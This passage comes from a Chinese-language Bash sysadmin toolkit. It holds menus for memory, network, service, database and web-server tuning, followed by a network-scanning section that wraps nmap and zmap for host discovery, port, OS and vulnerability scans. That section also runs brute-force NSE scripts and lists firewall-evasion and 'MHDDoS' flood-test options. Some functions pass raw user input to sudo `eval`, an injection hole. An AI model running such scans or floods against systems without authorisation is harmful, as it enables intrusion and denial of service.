                        echo -e "${GREEN}发现SSD: $disk_name${NC}"

                        sudo systemctl enable fstrim.timer
                        sudo systemctl start fstrim.timer

                        sudo fstrim -v /
                    fi
                fi
            done
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    echo -e "${GREEN}磁盘优化建议已提供！${NC}"
    log_operation "磁盘优化" "类型: $disk_choice" "INFO"
}

memory_optimization() {
    echo -e "${BOLD}内存优化${NC}"

    echo "选择优化类型:"
    echo "1. 调整内存参数"
    echo "2. 清理缓存"
    echo "3. 监控内存使用"
    echo "4. 优化swap"
    read -p "请选择: " memory_choice

    case $memory_choice in
        1)
            echo -e "${CYAN}当前内存参数:${NC}"
            sysctl -a | grep -E "vm.dirty|vm.swappiness|vm.vfs_cache_pressure"

            echo -e "\n${YELLOW}建议参数:${NC}"
            echo "vm.swappiness=10 (降低swap使用)"
            echo "vm.vfs_cache_pressure=50 (减少inode缓存压力)"
            echo "vm.dirty_ratio=10 (减少脏页比例)"
            echo "vm.dirty_background_ratio=5 (后台脏页比例)"
            ;;
        2)
            echo -e "${CYAN}清理内存缓存...${NC}"

            echo "清理前内存状态:"
            free -h

            echo -e "\n清理PageCache:"
            sudo sync && echo 1 | sudo tee /proc/sys/vm/drop_caches

            echo -e "\n清理dentries和inodes:"
            sudo sync && echo 2 | sudo tee /proc/sys/vm/drop_caches

            echo -e "\n清理PageCache、dentries和inodes:"
            sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches

            echo -e "\n清理后内存状态:"
            free -h
            ;;
        3)
            echo -e "${CYAN}内存使用监控${NC}"

            echo -e "${YELLOW}内存使用情况:${NC}"
            free -h

            echo -e "\n${YELLOW}占用内存最多的进程:${NC}"
            ps aux --sort=-%mem | head -10

            echo -e "\n${YELLOW}内存使用详情:${NC}"
            cat /proc/meminfo | grep -E "MemTotal|MemFree|MemAvailable|Buffers|Cached|Swap"
            ;;
        4)
            echo -e "${CYAN}优化swap配置...${NC}"

            echo -e "${YELLOW}当前swap状态:${NC}"
            swapon --show

            echo "vm.swappiness=10" | sudo tee -a /etc/sysctl.conf
            sudo sysctl -p

            echo -e "\n${GREEN}swap优化完成！${NC}"
            echo "建议: 如果内存充足，可以适当降低swappiness值"
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "内存优化" "类型: $memory_choice" "INFO"
}

network_optimization() {
    echo -e "${BOLD}网络优化${NC}"

    echo "选择优化类型:"
    echo "1. 调整TCP参数"
    echo "2. 优化网卡参数"
    echo "3. DNS优化"
    echo "4. 连接数优化"
    read -p "请选择: " network_choice

    case $network_choice in
        1)
            echo -e "${CYAN}调整TCP参数...${NC}"

            sudo cp /etc/sysctl.conf /etc/sysctl.conf.network.backup

            local tmp_conf=$(mktemp)
            cat << EOF > "$tmp_conf"

# ==================== TCP优化 ====================
# 增加TCP最大缓冲区大小
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728
net.ipv4.tcp_rmem = 4096 87380 134217728
net.ipv4.tcp_wmem = 4096 65536 134217728

# 增加可用端口范围
net.ipv4.ip_local_port_range = 1024 65535

# 增加TCP连接队列大小
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 65535

# TCP快速打开
net.ipv4.tcp_fastopen = 3

# 减少TIME_WAIT
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 30

# 启用TCP窗口缩放
net.ipv4.tcp_window_scaling = 1
EOF

            while IFS= read -r line; do
                if [[ -n "$line" && ! "$line" =~ ^# ]]; then
                    key=$(echo "$line" | cut -d'=' -f1 | xargs)
                    if ! grep -q "^${key}[[:space:]]*=" /etc/sysctl.conf; then
                        echo "$line" | sudo tee -a /etc/sysctl.conf > /dev/null
                    fi
                else
                    echo "$line" | sudo tee -a /etc/sysctl.conf > /dev/null
                fi
            done < "$tmp_conf"
            rm -f "$tmp_conf"

            sudo sysctl -p
            echo -e "${GREEN}TCP参数优化完成！${NC}"
            ;;
        2)
            echo -e "${CYAN}优化网卡参数...${NC}"

            for iface in $(ls /sys/class/net/ | grep -v lo); do
                echo -e "\n${YELLOW}网卡: $iface${NC}"

                echo "当前MTU: $(cat /sys/class/net/$iface/mtu 2>/dev/null)"
                echo "当前速度: $(cat /sys/class/net/$iface/speed 2>/dev/null 2>/dev/null || echo "未知") Mbps"

                if ethtool $iface 2>/dev/null | grep -q "Speed: 1000"; then
                    echo "建议: sudo ethtool -K $iface tso on gso on gro on"
                    echo "建议MTU: 1500"
                fi
            done
            ;;
        3)
            echo -e "${CYAN}DNS优化...${NC}"

            sudo cp /etc/resolv.conf /etc/resolv.conf.backup

            cat << EOF | sudo tee /etc/resolv.conf
# Google DNS
nameserver 8.8.8.8
nameserver 8.8.4.4

# Cloudflare DNS
nameserver 1.1.1.1
nameserver 1.0.0.1

# 阿里DNS
nameserver 223.5.5.5
nameserver 223.6.6.6
EOF

            if ! command -v dnsmasq &> /dev/null; then
                echo -e "${CYAN}安装dnsmasq进行DNS缓存...${NC}"
                eval "$PKG_INSTALL dnsmasq"
                sudo systemctl enable dnsmasq
                sudo systemctl start dnsmasq
            fi

            echo -e "${GREEN}DNS优化完成！${NC}"
            ;;
        4)
            echo -e "${CYAN}连接数优化...${NC}"

            echo -e "${YELLOW}当前文件描述符限制:${NC}"
            ulimit -n

            echo -e "\n${YELLOW}系统级限制:${NC}"
            cat /proc/sys/fs/file-max

            echo -e "\n${CYAN}提高限制...${NC}"
            echo "* soft nofile 1048576" | sudo tee -a /etc/security/limits.conf
            echo "* hard nofile 1048576" | sudo tee -a /etc/security/limits.conf
            echo "fs.file-max = 2097152" | sudo tee -a /etc/sysctl.conf
            sudo sysctl -p

            echo -e "${GREEN}连接数优化完成！需要重新登录生效${NC}"
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "网络优化" "类型: $network_choice" "INFO"
}

process_priority() {
    echo -e "${BOLD}进程优先级调整${NC}"

    echo "选择操作:"
    echo "1. 查看高CPU进程"
    echo "2. 查看高内存进程"
    echo "3. 调整进程优先级"
    echo "4. 杀死问题进程"
    read -p "请选择: " process_choice

    case $process_choice in
        1)
            echo -e "${CYAN}高CPU使用进程:${NC}"
            ps aux --sort=-%cpu | head -20
            ;;
        2)
            echo -e "${CYAN}高内存使用进程:${NC}"
            ps aux --sort=-%mem | head -20
            ;;
        3)
            echo -e "${CYAN}调整进程优先级${NC}"
            read -p "输入进程PID: " pid
            read -p "输入优先级 (-20最高, 19最低): " priority

            if [ -n "$pid" ] && [ -n "$priority" ]; then
                sudo renice -n "$priority" -p "$pid"
                echo -e "${GREEN}进程 $pid 优先级已调整为 $priority${NC}"
            else
                echo -e "${RED}输入无效${NC}"
            fi
            ;;
        4)
            echo -e "${CYAN}杀死进程${NC}"
            read -p "输入进程PID: " pid

            if [ -n "$pid" ]; then
                if confirm_action "确定杀死进程 $pid？" "n"; then
                    sudo kill -9 "$pid"
                    echo -e "${GREEN}进程 $pid 已被终止${NC}"
                fi
            else
                echo -e "${RED}输入无效${NC}"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "进程优先级调整" "类型: $process_choice" "INFO"
}

service_optimization() {
    echo -e "${BOLD}系统服务优化${NC}"

    echo "选择操作:"
    echo "1. 查看所有服务"
    echo "2. 禁用不必要的服务"
    echo "3. 优化服务启动时间"
    echo "4. 服务依赖分析"
    read -p "请选择: " service_choice

    case $service_choice in
        1)
            echo -e "${CYAN}系统服务状态:${NC}"
            systemctl list-units --type=service --state=running | head -30

            echo -e "\n${CYAN}开机启动的服务:${NC}"
            systemctl list-unit-files --type=service --state=enabled | head -30
            ;;
        2)
            echo -e "${CYAN}建议禁用的服务 (如果不需要):${NC}"

            local services_to_disable=(
                "bluetooth"
                "cups"
                "avahi-daemon"
                "postfix"
                "sendmail"
                "exim"
                "snmpd"
                "nfs-server"
                "rpcbind"
            )

            for service in "${services_to_disable[@]}"; do
                if systemctl is-enabled "$service" 2>/dev/null | grep -q "enabled"; then
                    echo "$service - 已启用"
                    if confirm_action "禁用 $service？" "n"; then
                        sudo systemctl disable "$service"
                        sudo systemctl stop "$service"
                        echo -e "${GREEN}已禁用 $service${NC}"
                    fi
                fi
            done
            ;;
        3)
            echo -e "${CYAN}优化服务启动时间...${NC}"

            echo -e "${YELLOW}启用并行启动...${NC}"
            sudo systemctl enable systemd-analyze

            echo -e "\n${YELLOW}启动时间分析:${NC}"
            systemd-analyze blame | head -20

            echo -e "\n${YELLOW}建议延迟启动的服务:${NC}"
            local services_to_delay=(
                "docker"
                "mysql"
                "postgresql"
                "nginx"
                "apache2"
            )

            for service in "${services_to_delay[@]}"; do
                if systemctl is-enabled "$service" 2>/dev/null | grep -q "enabled"; then
                    echo "$service"
                    echo "[Service]" | sudo tee /etc/systemd/system/$service.service.d/override.conf
                    echo "ExecStartPre=/bin/sleep 5" | sudo tee -a /etc/systemd/system/$service.service.d/override.conf
                fi
            done

            sudo systemctl daemon-reload
            ;;
        4)
            echo -e "${CYAN}服务依赖分析...${NC}"

            read -p "输入服务名: " service_name

            if systemctl list-unit-files | grep -q "$service_name.service"; then
                echo -e "\n${YELLOW}服务依赖:${NC}"
                systemctl list-dependencies "$service_name.service"

                echo -e "\n${YELLOW}服务状态:${NC}"
                systemctl status "$service_name.service"
            else
                echo -e "${RED}服务不存在${NC}"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "系统服务优化" "类型: $service_choice" "INFO"
}

database_optimization() {
    echo -e "${BOLD}数据库优化${NC}"

    echo "选择数据库类型:"
    echo "1. MySQL/MariaDB"
    echo "2. PostgreSQL"
    echo "3. Redis"
    echo "4. MongoDB"
    read -p "请选择: " db_choice

    case $db_choice in
        1)
            echo -e "${CYAN}MySQL/MariaDB优化${NC}"

            if command -v mysql &> /dev/null; then
                if [ -f /etc/mysql/my.cnf ]; then
                    sudo cp /etc/mysql/my.cnf /etc/mysql/my.cnf.backup.$(date +%Y%m%d)
                elif [ -f /etc/my.cnf ]; then
                    sudo cp /etc/my.cnf /etc/my.cnf.backup.$(date +%Y%m%d)
                fi

                echo -e "${YELLOW}当前状态:${NC}"
                mysql -e "SHOW VARIABLES LIKE 'innodb_buffer_pool_size';"
                mysql -e "SHOW VARIABLES LIKE 'max_connections';"
                mysql -e "SHOW VARIABLES LIKE 'query_cache%';"

                echo -e "\n${YELLOW}优化建议:${NC}"
                echo "1. innodb_buffer_pool_size = 系统内存的70%"
                echo "2. max_connections = 根据需求调整"
                echo "3. 启用query_cache"
                echo "4. 定期优化表: OPTIMIZE TABLE tablename"

                echo -e "\n${CYAN}运行优化查询...${NC}"
                mysql -e "ANALYZE TABLE mysql.user;" 2>/dev/null || true

            else
                echo -e "${YELLOW}MySQL未安装${NC}"
            fi
            ;;
        2)
            echo -e "${CYAN}PostgreSQL优化${NC}"

            if command -v psql &> /dev/null; then
                echo -e "${YELLOW}当前配置:${NC}"
                sudo -u postgres psql -c "SHOW shared_buffers;" 2>/dev/null || true
                sudo -u postgres psql -c "SHOW work_mem;" 2>/dev/null || true
                sudo -u postgres psql -c "SHOW maintenance_work_mem;" 2>/dev/null || true

                echo -e "\n${YELLOW}优化建议:${NC}"
                echo "1. shared_buffers = 系统内存的25%"
                echo "2. work_mem = 根据并发连接调整"
                echo "3. 定期执行VACUUM ANALYZE"
                echo "4. 启用并行查询"

                echo -e "\n${CYAN}优化命令示例:${NC}"
                echo "sudo -u postgres psql -c 'VACUUM ANALYZE;'"
                echo "sudo -u postgres psql -c 'REINDEX DATABASE dbname;'"

            else
                echo -e "${YELLOW}PostgreSQL未安装${NC}"
            fi
            ;;
        3)
            echo -e "${CYAN}Redis优化${NC}"

            if command -v redis-cli &> /dev/null && systemctl is-active --quiet redis; then
                echo -e "${YELLOW}Redis信息:${NC}"
                redis-cli INFO memory | head -20
                redis-cli INFO stats | head -20

                echo -e "\n${YELLOW}优化建议:${NC}"
                echo "1. 设置maxmemory限制"
                echo "2. 选择合适的淘汰策略"
                echo "3. 启用AOF持久化"
                echo "4. 优化RDB快照频率"

                echo -e "\n${CYAN}优化命令:${NC}"
                echo "redis-cli CONFIG SET maxmemory 1gb"
                echo "redis-cli CONFIG SET maxmemory-policy allkeys-lru"
                echo "redis-cli BGSAVE"

            else
                echo -e "${YELLOW}Redis未安装或未运行${NC}"
            fi
            ;;
        4)
            echo -e "${CYAN}MongoDB优化${NC}"

            if command -v mongo &> /dev/null && systemctl is-active --quiet mongod; then
                echo -e "${YELLOW}MongoDB状态:${NC}"
                mongo --eval "db.serverStatus().mem" 2>/dev/null || true

                echo -e "\n${YELLOW}优化建议:${NC}"
                echo "1. 确保有足够的内存"
                echo "2. 使用合适的存储引擎"
                echo "3. 创建合适的索引"
                echo "4. 定期执行压缩"

            else
                echo -e "${YELLOW}MongoDB未安装或未运行${NC}"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "数据库优化" "类型: $db_choice" "INFO"
}

webserver_optimization() {
    echo -e "${BOLD}Web服务器优化${NC}"

    echo "选择Web服务器:"
    echo "1. Nginx"
    echo "2. Apache"
    echo "3. 通用优化"
    read -p "请选择: " webserver_choice

    case $webserver_choice in
        1)
            echo -e "${CYAN}Nginx优化${NC}"

            if command -v nginx &> /dev/null; then
                sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup.$(date +%Y%m%d)

                echo -e "${YELLOW}当前worker配置:${NC}"
                grep -E "worker_processes|worker_connections|keepalive_timeout" /etc/nginx/nginx.conf

                echo -e "\n${YELLOW}优化建议:${NC}"
                echo "1. worker_processes = CPU核心数"
                echo "2. worker_connections = 10240"
                echo "3. keepalive_timeout = 65"
                echo "4. 启用gzip压缩"
                echo "5. 启用缓存"

                echo -e "\n${CYAN}优化配置示例:${NC}"
                cat << EOF
worker_processes auto;
worker_rlimit_nofile 65535;

events {
    worker_connections 10240;
    use epoll;
    multi_accept on;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    gzip on;
    gzip_vary on;
    gzip_comp_level 6;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml+rss text/javascript;

    open_file_cache max=10000 inactive=30s;
    open_file_cache_valid 60s;
    open_file_cache_min_uses 2;
    open_file_cache_errors on;
}
EOF

            else
                echo -e "${YELLOW}Nginx未安装${NC}"
            fi
            ;;
        2)
            echo -e "${CYAN}Apache优化${NC}"

            if command -v apache2 &> /dev/null || command -v httpd &> /dev/null; then
                if [ -f /etc/apache2/apache2.conf ]; then
                    conf_file="/etc/apache2/apache2.conf"
                    sudo cp "$conf_file" "${conf_file}.backup.$(date +%Y%m%d)"
                elif [ -f /etc/httpd/conf/httpd.conf ]; then
                    conf_file="/etc/httpd/conf/httpd.conf"
                    sudo cp "$conf_file" "${conf_file}.backup.$(date +%Y%m%d)"
                fi

                if [ -n "$conf_file" ]; then
                    echo -e "${YELLOW}当前MPM配置:${NC}"
                    grep -i "mpm" "$conf_file" | head -10

                    echo -e "\n${YELLOW}优化建议:${NC}"
                    echo "1. 使用event或worker MPM"
                    echo "2. 调整StartServers/MinSpareThreads/MaxSpareThreads"
                    echo "3. 设置MaxRequestWorkers"
                    echo "4. 启用KeepAlive"
                    echo "5. 调整Timeout"

                    echo -e "\n${CYAN}优化配置示例 (event MPM):${NC}"
                    cat << EOF
<IfModule mpm_event_module>
    StartServers 2
    MinSpareThreads 25
    MaxSpareThreads 75
    ThreadLimit 64
    ThreadsPerChild 25
    MaxRequestWorkers 150
    MaxConnectionsPerChild 10000
</IfModule>

KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 5

Timeout 30
EOF
                fi
            else
                echo -e "${YELLOW}Apache未安装${NC}"
            fi
            ;;
        3)
            echo -e "${CYAN}通用Web服务器优化${NC}"

            echo -e "${YELLOW}通用优化建议:${NC}"
            echo "1. 启用HTTP/2"
            echo "2. 启用Brotli压缩 (如果支持)"
            echo "3. 设置合适的缓存头"
            echo "4. 启用HSTS"
            echo "5. 优化SSL/TLS配置"
            echo "6. 使用CDN"
            echo "7. 启用缓存"
            echo "8. 图片优化"

            echo -e "\n${CYAN}SSL/TLS优化示例:${NC}"
            cat << EOF
# 使用现代加密套件
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;

# 启用OCSP Stapling
ssl_stapling on;
ssl_stapling_verify on;

# 设置SSL会话缓存
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 1d;
ssl_session_tickets off;
EOF
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "Web服务器优化" "类型: $webserver_choice" "INFO"
}

network_scan_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}网络扫描中心${NC}"
        echo -e "${RED}注意: 仅限授权测试${NC}\n"
        echo -e "${BLUE}1.${NC} 局域网设备发现 (ARP扫描)"
        echo -e "${BLUE}2.${NC} 快速端口扫描 (TCP常用端口)"
        echo -e "${BLUE}3.${NC} 详细端口扫描 (全端口+服务识别)"
        echo -e "${BLUE}4.${NC} 操作系统指纹识别"
        echo -e "${BLUE}5.${NC} 漏洞扫描 (NSE基本脚本)"
        echo -e "${BLUE}6.${NC} 批量IP扫描 (从文件读取)"
        echo -e "${BLUE}7.${NC} 网段扫描 (CIDR格式)"
        echo -e "${BLUE}8.${NC} 扫描结果查看"
        echo -e "${BLUE}9.${NC} Zmap 极速扫描"
        echo -e "${BLUE}10.${NC} Zmap 高级选项"
        echo -e "${BLUE}11.${NC} Nmap 高级功能"
        echo -e "${BLUE}12.${NC} MHDDoS 压力测试（全功能）"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        read -p "请选择: " choice

        case $choice in
            1) scan_arp_discovery ;;
            2) scan_fast_ports ;;
            3) scan_detailed_ports ;;
            4) scan_os_fingerprint ;;
            5) scan_vulnerability ;;
            6) scan_from_file ;;
            7) scan_cidr ;;
            8) view_scan_results ;;
            9) zmap_fast_scan ;;
            10) zmap_advanced ;;
            11) nmap_advanced_menu ;;
            12) mhddos_main_menu ;;      # 新函数：MHDDoS主菜单
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}
# ==================== Zmap 极速扫描 ====================
# 检查并安装 zmap
check_zmap() {
    if ! command -v zmap &> /dev/null; then
        echo -e "${YELLOW}zmap未安装，正在安装...${NC}"
        case "$PKG_MANAGER" in
            apt) sudo apt install -y zmap ;;
            yum|dnf) sudo yum install -y zmap ;;
            pacman) sudo pacman -S --noconfirm zmap ;;
            *) echo -e "${RED}请手动安装 zmap${NC}"; return 1 ;;
        esac
        if ! command -v zmap &> /dev/null; then
            echo -e "${RED}zmap安装失败${NC}"
            return 1
        fi
    fi
    return 0
}

# Zmap 快速扫描（默认TCP SYN扫描）
zmap_fast_scan() {
    echo -e "${BOLD}Zmap 极速扫描${NC}"
    check_zmap || return
    
    read -p "输入目标网段 (如 192.168.1.0/24): " target
    [ -z "$target" ] && target="192.168.1.0/24"
    
    read -p "输入要扫描的端口 (默认 80): " port
    port=${port:-80}
    
    echo -e "${CYAN}开始 Zmap 扫描，这通常很快...${NC}"
    echo -e "${YELLOW}注意: Zmap 可能被网络防火墙拦截，请确保你有授权${NC}"
    
    sudo zmap -p "$port" -o /tmp/zmap_output.txt "$target"
    
    if [ -s /tmp/zmap_output.txt ]; then
        echo -e "${GREEN}扫描完成，开放端口 $port 的IP列表:${NC}"
        cat /tmp/zmap_output.txt
        save_scan_result "zmap_scan_$port" "$(cat /tmp/zmap_output.txt)"
    else
        echo -e "${YELLOW}未发现开放端口 $port 的主机${NC}"
    fi
    rm -f /tmp/zmap_output.txt
}

# Zmap 高级选项
zmap_advanced() {
    echo -e "${BOLD}Zmap 高级选项${NC}"
    check_zmap || return
    
    echo -e "${CYAN}请选择 Zmap 扫描模式:${NC}"
    echo "1. TCP SYN 扫描 (默认)"
    echo "2. TCP 连接扫描"
    echo "3. ICMP Echo 扫描"
    echo "4. UDP 扫描"
    echo "5. 自定义参数"
    read -p "请选择: " mode
    
    read -p "输入目标网段 (如 192.168.1.0/24): " target
    [ -z "$target" ] && target="192.168.1.0/24"
    
    read -p "输入端口范围 (如 1-1024, 多个端口用逗号, 默认 80): " ports
    ports=${ports:-80}
    
    local cmd="sudo zmap"
    case $mode in
        1) cmd="$cmd -p $ports" ;;
        2) cmd="$cmd -p $ports --probe-module=tcp_synscan" ;;  # 实际上默认就是tcp_synscan
        3) cmd="$cmd -M icmp_echo" ;;
        4) cmd="$cmd -M udp -p $ports" ;;
        5)
            read -p "请输入完整 Zmap 命令参数 (不包括目标网段): " extra
            cmd="$cmd $extra"
            ;;
        *) cmd="$cmd -p $ports" ;;
    esac
    
    read -p "输出文件路径 (默认 /tmp/zmap_advanced.txt): " outfile
    outfile=${outfile:-/tmp/zmap_advanced.txt}
    
    echo -e "${CYAN}执行命令: $cmd $target -o $outfile${NC}"
    eval "$cmd $target -o $outfile"
    
    if [ -s "$outfile" ]; then
        echo -e "${GREEN}扫描结果保存至: $outfile${NC}"
        echo -e "${YELLOW}前20行:${NC}"
        head -20 "$outfile"
        save_scan_result "zmap_advanced" "$(cat "$outfile")"
    else
        echo -e "${YELLOW}未发现结果${NC}"
    fi
}

# 检查nmap安装
check_nmap() {
    if ! command -v nmap &> /dev/null; then
        echo -e "${YELLOW}nmap未安装，正在安装...${NC}"
        eval "$PKG_INSTALL nmap"
        if ! command -v nmap &> /dev/null; then
            echo -e "${RED}nmap安装失败，请手动安装${NC}"
            return 1
        fi
    fi
    return 0
}

# 保存扫描结果
save_scan_result() {
    local scan_name="$1"
    local scan_data="$2"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local result_file="$SCAN_RESULTS_DIR/${scan_name}_${timestamp}.txt"
    echo "$scan_data" > "$result_file"
    echo -e "${GREEN}扫描结果已保存: $result_file${NC}"
    log_operation "网络扫描" "类型: $scan_name, 文件: $result_file" "INFO"
}

# ARP发现扫描
scan_arp_discovery() {
    echo -e "${BOLD}局域网设备发现 (ARP扫描)${NC}"
    check_nmap || return
    
    read -p "输入要扫描的网段 (如 192.168.1.0/24, 默认本机网段): " cidr
    if [ -z "$cidr" ]; then
        # 自动获取本机网段
        local ip_info=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | grep -v '127.0.0.1' | head -1)
        if [ -z "$ip_info" ]; then
            echo -e "${RED}无法自动获取网段${NC}"
            read -p "请输入网段 (如 192.168.1.0/24): " cidr
        else
            cidr="$ip_info"
            echo -e "${CYAN}使用本机网段: $cidr${NC}"
        fi
    fi
    
    echo -e "${CYAN}正在进行ARP扫描...${NC}"
    local result=$(sudo nmap -sn "$cidr" | grep -E 'Nmap scan|MAC Address' | sed 's/Nmap scan report for //')
    echo "$result"
    save_scan_result "arp_scan" "$result"
}

# 快速端口扫描
scan_fast_ports() {
    echo -e "${BOLD}快速端口扫描${NC}"
    check_nmap || return
    
    read -p "输入目标IP或域名: " target
    [ -z "$target" ] && target="localhost"
    
    echo -e "${CYAN}扫描常用端口 (1-1024)...${NC}"
    local result=$(nmap -T4 -F "$target" | grep -E '^[0-9]+/')
    echo "$result"
    save_scan_result "fast_scan_$target" "$result"
}

# 详细端口扫描
scan_detailed_ports() {
    echo -e "${BOLD}详细端口扫描 (全端口+服务识别)${NC}"
    check_nmap || return
    
    read -p "输入目标IP或域名: " target
    [ -z "$target" ] && target="localhost"
    
    if ! confirm_action "全端口扫描可能耗时较长，继续？" "n"; then
        return
    fi
    
    echo -e "${CYAN}开始详细扫描...${NC}"
    local result=$(sudo nmap -sS -sV -p- --open "$target")
    echo "$result"
    save_scan_result "detailed_scan_$target" "$result"
}

# 操作系统指纹识别
scan_os_fingerprint() {
    echo -e "${BOLD}操作系统指纹识别${NC}"
    check_nmap || return
    
    read -p "输入目标IP或域名: " target
    [ -z "$target" ] && target="localhost"
    
    echo -e "${CYAN}进行OS探测...${NC}"
    local result=$(sudo nmap -O "$target" | grep -E 'OS details|Aggressive OS guesses')
    echo "$result"
    save_scan_result "os_scan_$target" "$result"
}

# 漏洞扫描
scan_vulnerability() {
    echo -e "${BOLD}漏洞扫描 (NSE基本脚本)${NC}"
    check_nmap || return
    
    read -p "输入目标IP或域名: " target
    [ -z "$target" ] && target="localhost"
    
    echo "选择漏洞脚本类别:"
    echo "1. 常用漏洞检测 (vuln)"
    echo "2. 安全配置检查"
    echo "3. 暴力破解检测"
    read -p "请选择: " vuln_choice
    
    local script_arg="vuln"
    case $vuln_choice in
        1) script_arg="vuln" ;;
        2) script_arg="default and safe" ;;
        3) script_arg="brute" ;;
        *) script_arg="vuln" ;;
    esac
    
    echo -e "${CYAN}运行NSE脚本: $script_arg${NC}"
    local result=$(sudo nmap --script="$script_arg" "$target" | grep -E '^[|]')
    echo "$result"
    save_scan_result "vuln_scan_$target" "$result"
}

# 从文件读取IP进行批量扫描
scan_from_file() {
    echo -e "${BOLD}批量IP扫描${NC}"
    check_nmap || return
    
    read -p "输入包含IP列表的文件路径: " file_path
    if [ ! -f "$file_path" ]; then
        echo -e "${RED}文件不存在${NC}"
        return
    fi
    
    echo "选择扫描模式:"
    echo "1. 仅Ping检测"
    echo "2. 端口扫描 (快速)"
    read -p "请选择: " mode
    
    if [ "$mode" = "1" ]; then
        echo -e "${CYAN}批量Ping检测...${NC}"
        local result=$(nmap -sL -iL "$file_path" | grep -E 'Nmap scan|Host is up')
    else
        echo -e "${CYAN}批量端口扫描...${NC}"
        local result=$(sudo nmap -F -iL "$file_path" -oG - | grep -E 'Host|Ports')
    fi
    
    echo "$result"
    save_scan_result "batch_scan" "$result"
}

# CIDR网段扫描
scan_cidr() {
    echo -e "${BOLD}网段扫描 (CIDR)${NC}"
    check_nmap || return
    
    read -p "输入CIDR网段 (如 192.168.1.0/24): " cidr
    
    echo "选择扫描类型:"
    echo "1. Ping扫描 (在线主机)"
    echo "2. 端口扫描 (常用端口)"
    read -p "请选择: " scan_type
    
    if [ "$scan_type" = "1" ]; then
        echo -e "${CYAN}Ping扫描 $cidr...${NC}"
        local result=$(sudo nmap -sn "$cidr" | grep -E 'Nmap scan|Host is up')
    else
        echo -e "${CYAN}端口扫描 $cidr...${NC}"
        local result=$(sudo nmap -T4 -F "$cidr" -oG - | grep -E 'Host|Ports')
    fi
    
    echo "$result"
    save_scan_result "cidr_scan_$cidr" "$result"
}

# 查看扫描结果
view_scan_results() {
    echo -e "${BOLD}扫描结果查看${NC}"
    
    if [ ! -d "$SCAN_RESULTS_DIR" ] || [ -z "$(ls -A "$SCAN_RESULTS_DIR")" ]; then
        echo -e "${YELLOW}暂无扫描结果${NC}"
        return
    fi
    
    echo -e "${CYAN}扫描结果列表:${NC}"
    local count=1
    local files=("$SCAN_RESULTS_DIR"/*)
    for file in "${files[@]}"; do
        if [ -f "$file" ]; then
            echo "$count. $(basename "$file") - $(date -r "$file" '+%Y-%m-%d %H:%M:%S')"
            ((count++))
        fi
    done
    
    read -p "选择要查看的文件编号: " file_num
    if [[ "$file_num" =~ ^[0-9]+$ ]] && [ "$file_num" -le ${#files[@]} ] && [ "$file_num" -ge 1 ]; then
        less "${files[$((file_num-1))]}"
    fi
}
# ==================== Nmap 高级功能 ====================
nmap_advanced_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}Nmap 高级功能${NC}"
        echo -e "${BLUE}1.${NC} 操作系统与服务探测"
        echo -e "${BLUE}2.${NC} 版本探测 (详细服务版本)"
        echo -e "${BLUE}3.${NC} 脚本扫描 (选择脚本类别)"
        echo -e "${BLUE}4.${NC} 防火墙规避扫描"
        echo -e "${BLUE}5.${NC} 定时与性能优化"
        echo -e "${BLUE}6.${NC} 输出格式转换"
        echo -e "${BLUE}7.${NC} Nmap 图形化界面 (zenmap)"
        echo -e "${BLUE}8.${NC} 自定义参数 (输入任意 nmap 命令)"
        echo -e "${BLUE}0.${NC} 返回上级"
        read -p "请选择: " choice

        case $choice in
            1) nmap_os_service ;;
            2) nmap_version_detection ;;
            3) nmap_script_scan ;;
            4) nmap_firewall_evasion ;;
            5) nmap_performance ;;
            6) nmap_output_convert ;;
            7) install_zenmap ;;
            8) nmap_custom ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac
        echo ""
        read -p "按回车键继续..."
    done
}

# 新增自定义 nmap 函数
nmap_custom() {
    echo -e "${BOLD}自定义 Nmap 命令${NC}"
    read -p "输入完整的 nmap 命令（例如：nmap -sS -p 1-1000 192.168.1.1）: " cmd
    if [ -z "$cmd" ]; then
        echo -e "${RED}命令不能为空${NC}"
        return
    fi
    # 确保用户输入了 nmap，如果没输入则自动补全
    if ! echo "$cmd" | grep -q "^nmap"; then
        cmd="nmap $cmd"
    fi
    echo -e "${CYAN}执行: $cmd${NC}"
    eval "sudo $cmd"
    log_operation "nmap自定义" "命令: $cmd" "INFO"
}
nmap_os_service() {
    echo -e "${BOLD}操作系统与服务探测${NC}"
    check_nmap || return
    read -p "输入目标IP或域名: " target
    echo -e "${CYAN}执行: nmap -O -sV $target${NC}"
    sudo nmap -O -sV "$target"
    log_operation "nmap高级" "OS与服务探测: $target" "INFO"
}

nmap_version_detection() {
    echo -e "${BOLD}详细版本探测${NC}"
    check_nmap || return
    read -p "输入目标IP或域名: " target
    echo -e "${CYAN}执行: nmap -sV --version-intensity 9 $target${NC}"
